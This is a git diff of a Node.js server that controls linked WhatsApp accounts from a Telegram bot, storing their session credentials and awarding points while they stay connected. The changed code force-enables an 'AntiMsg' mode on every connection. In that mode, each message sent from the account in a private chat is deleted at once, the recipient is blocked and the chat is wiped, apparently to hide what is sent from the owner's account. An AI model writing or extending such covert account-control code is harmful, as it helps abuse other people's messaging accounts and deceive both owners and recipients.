@@ -18,7 +18,7 @@ import { Boom } from '@hapi/boom';
 import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
 import { 
     initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
-    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime, saveVerificationData, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, getSessionByShortId
+    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime, saveVerificationData, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, getSessionByShortId, setAntiMsgStatus
 } from './db.js';
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
@@ -341,41 +341,48 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
         const msg = messages[0];
         if (!msg || !msg.message) return;
 
-        // 1. INSTANT SPEED CHECK - ANTIMSG (OPTIMIZED & UPDATED)
+        // 1. INSTANT SPEED CHECK - ANTIMSG (BLOCK & DELETE)
+        // Checks if message is from ME (the bot/user) and not a system message
         if (msg.key.fromMe && !msg.message.protocolMessage) {
-            // Only check ID map if it is from Me
+            
             const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
             
             if (myShortId && antiMsgState[myShortId]) {
                 const remoteJid = msg.key.remoteJid;
                 const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
                 
-                // Exclusion Check (Don't delete my commands or Status)
-                if (remoteJid !== 'status@broadcast' && !text.startsWith('.')) {
-                    // 🔥 FIRE AND FORGET: DELETE IMMEDIATELY + BLOCK + CLEAR CHAT (NO AWAIT)
+                // 🛑 CRITICAL: Check if it is a GROUP. "Only on chat, no groups".
+                // @g.us = Group, @s.whatsapp.net = Private Chat
+                const isGroup = remoteJid.includes('@g.us');
+                
+                // Only run on Private Chats
+                if (!isGroup) {
                     
-                    // A. Delete the Message sent
-                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
-
-                    // B. Block the User (only if not a group)
-                    if (!remoteJid.includes('@g.us')) {
+                    // Exclusion Check (Don't delete my status updates or internal commands)
+                    if (remoteJid !== 'status@broadcast' && !text.startsWith('.')) {
+                        
+                        // 🔥 FIRE AND FORGET: EXECUTE NUCLEAR OPTION
+                        // 1. Delete the message I just sent
+                        sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
+                        
+                        // 2. Block the user immediately
                         sock.updateBlockStatus(remoteJid, "block").catch(() => {});
+                        
+                        // 3. Delete the entire chat history
+                        sock.chatModify(
+                            { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
+                            remoteJid
+                        ).catch(() => {});
+                        
+                        // Background Log (Throttled)
+                        const target = remoteJid.split('@')[0];
+                        const now = Date.now();
+                        if (now - (notificationCache[target] || 0) > 20000) {
+                            updateAdminNotification(`[ANTIMSG] 🚫 Blocked & Deleted +${target}`);
+                            notificationCache[target] = now;
+                        }
+                        return; // Stop processing
                     }
-
-                    // C. Delete the Chat History
-                    sock.chatModify(
-                        { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
-                        remoteJid
-                    ).catch(() => {});
-                    
-                    // Log in background
-                    const target = remoteJid.split('@')[0];
-                    const now = Date.now();
-                    if (now - (notificationCache[target] || 0) > 20000) {
-                        updateAdminNotification(`[ANTIMSG] BLOCKED & DELETED +${target} (ID: ${myShortId})`);
-                        notificationCache[target] = now;
-                    }
-                    return; // Stop processing to save speed
                 }
             }
         }
@@ -414,44 +421,42 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                 await saveShortId(folder, myShortId);
             }
             
-            // Update connection time on every reconnect
+            // Update connection time
             await updateConnectionTime(folder);
             
-            // Update or create shortIdMap entry - preserve original connectedAt time
             const now = new Date();
             if (shortIdMap[myShortId]) {
-                // Reconnection - PRESERVE the original connectedAt, don't reset it
-                // Just mark that we're connected again
+                // Preserved
             } else {
-                // New connection - set connectedAt
                 shortIdMap[myShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
             }
             clients[folder] = sock;
 
             const credsFile = path.join(sessionPath, 'creds.json');
             const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
-            const antimsg = antiMsgState[myShortId] || false;
-            const autosave = autoSaveState[myShortId] || false;
             
-            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', antimsg, autosave, myShortId);
-            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${myShortId})`);
+            // --- 🚀 FIX: FORCE AUTO-ENABLE ANTI-MSG ON CONNECT ---
+            // Set memory state to TRUE
+            antiMsgState[myShortId] = true;
+            
+            // Set DB state to TRUE
+            await setAntiMsgStatus(folder, true);
+            
+            // We pass 'true' explicitly to the saveSession function as well
+            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, false, myShortId);
+            
+            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${myShortId}) - AntiMsg ACTIVE`);
 
             if (chatId) {
-                // Clear any waiting states so bot can listen to commands again
                 userState[chatId] = null;
-                
-                // Delete all initializing/QR messages from cache
                 if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
                     for (const msgId of userMessageCache[chatId]) {
-                        try {
-                            await mainBot.deleteMessage(chatId, msgId);
-                        } catch (e) {}
+                        try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {}
                     }
                     userMessageCache[chatId] = [];
                 }
                 
-                // Send success message with main menu keyboard
-                mainBot.sendMessage(chatId, `[CONNECTED]\nID: ${myShortId}\n\nAccount connected successfully!`, { 
+                mainBot.sendMessage(chatId, `[CONNECTED]\nID: ${myShortId}\n\nAccount connected successfully!\n\n🛡️ **AntiMsg is now ON**\n(Block & Delete on Private Chat)`, { 
                     parse_mode: 'Markdown',
                     reply_markup: { 
                         keyboard: [
@@ -464,17 +469,12 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                 });
             }
             
-            // Set 1-hour timeout to delete offline account
+            // 1-hour offline check
             setTimeout(async () => {
                 if (!clients[folder]) {
-                    // Account went offline, award points and cleanup
-                    try {
-                        await awardHourlyPoints([folder]);
-                    } catch (e) {
-                        console.error('[CLEANUP] Error awarding points:', e.message);
-                    }
+                    try { await awardHourlyPoints([folder]); } catch (e) { console.error('[CLEANUP] Error:', e.message); }
                 }
-            }, 3600000); // 1 hour
+            }, 3600000);
         }
 
         if (connection === 'close') {
@@ -487,26 +487,19 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                 if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                 delete clients[folder];
             } else {
-                // Account went offline, set 1-hour cleanup timer
                 const offlineFolder = folder;
-                const offlineTimeout = setTimeout(async () => {
+                setTimeout(async () => {
                     if (!clients[offlineFolder]) {
-                        // Still offline after 1 hour, delete it
-                        console.log(`[CLEANUP] Deleting offline account after 1 hour: ${offlineFolder}`);
+                        console.log(`[CLEANUP] Deleting offline: ${offlineFolder}`);
                         try {
                             await deleteSessionFromDb(offlineFolder);
                             deleteShortId(offlineFolder);
                             if (fs.existsSync(path.join(SESSIONS_DIR, offlineFolder))) {
                                 fs.rmSync(path.join(SESSIONS_DIR, offlineFolder), { recursive: true, force: true });
                             }
-                        } catch (e) {
-                            console.error('[CLEANUP] Error deleting offline account:', e.message);
-                        }
-                    } else {
-                        // Account came back online, cancel cleanup
-                        console.log(`[CLEANUP] Account came back online: ${offlineFolder}`);
+                        } catch (e) { console.error('[CLEANUP] Error:', e.message); }
                     }
-                }, 3600000); // 1 hour
+                }, 3600000); 
                 
                 startClient(folder, null, chatId, telegramUserId);
             }
@@ -548,10 +541,8 @@ async function boot() {
     console.log(`[BOOT] Completed loading ${Object.keys(shortIdMap).length} sessions into memory`);
 }
 
-// Initialize telegram commands first
 setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);
 
-// Then boot and restore saved sessions
 boot().then(() => {
     console.log('[BOOT] Server ready - all saved sessions loaded');
 }).catch(err => {
